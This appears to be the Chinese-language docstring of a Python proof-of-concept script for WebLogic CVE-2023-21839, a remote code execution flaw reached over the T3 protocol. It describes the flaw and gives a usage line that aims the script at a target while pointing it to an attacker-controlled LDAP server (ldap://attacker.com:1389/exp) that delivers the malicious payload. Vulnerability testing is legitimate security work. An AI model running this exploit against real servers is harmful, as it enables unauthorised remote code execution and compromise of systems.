...
"""
WebLogic CVE-2023-21839 POC 检测脚本

漏洞描述:
Oracle WebLogic Server 存在远程代码执行漏洞(CVE-2023-21839)。
攻击者可以通过 T3 协议发送恶意请求来执行任意代码。
...
使用方法:
    python CVE-2023-21839.py -ip 127.0.0.1 -p 7001 -l ldap://attacker.com:1389/exp

参数说明:
    ip: 目标IP地址
    port: 目标端口,默认7001
    ldap: LDAP服务器地址,用于接收反序列化请求

返回值:
    成功时发送恶意payload,失败时打印错误信息
